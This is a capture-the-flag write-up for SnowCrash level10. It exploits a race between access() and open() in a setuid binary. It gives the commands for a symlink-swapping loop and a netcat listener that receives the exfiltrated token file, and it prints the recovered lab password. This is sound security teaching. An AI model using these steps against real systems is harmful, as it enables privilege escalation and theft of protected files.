## level10

There is a level10 executable file and a token file for which I don't have read rights. Running the binary file gives me some informations:
```
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it

level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
```

Thanks to the `strings` command, I can see that the program opens a socket on port 6969 to send the file. So I will use netcat to receive that file (`nc -l 6969`). Of course, I still have to find a way to trick the program into thinking that I have rights over the token file.

I notice the use in the program of the access() function. I don't know this function, but I guess it checks whether the calling process can access the given file. I confirm my intuition by reading the man, and I even find the solution to my problem. Here is the extract that interests me:

>Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.

This is called a race condition. What I'm going to do here is to run a small script that will generate a symbolic link to a file I own, then to the token file, all in an infinite loop. In another terminal, I will execute the level10 program by passing it the symbolic link. By running the program several times, we should end up with the flag: the access() function will have been executed with the symbolic link to my file, but when calling open(), the symbolic link will return to the token file.

So to summarize:
1. I start by creating a file that I own: `echo > /tmp/exploit`
2. In a first terminal, I create in loop my symbolic link: `while :; do ln -sf /tmp/exploit /tmp/ln; ln -sf ~/token /tmp/ln; done`
3. In another terminal, on my machine, I launch netcat and I listen to the port 6969: `nc -lk 6969` 
4. In a third terminal, in the VM, I run the level10 program several times with the symbolic link and the machine's IP address as arguments: `./level10 /tmp/ln ip`

After some attempts, I receive the content of the token file: "woupa2yuojeeaaed06riuj63c". The `su flag10` command works with this password and I can now run the `getflag` command and go to the next level.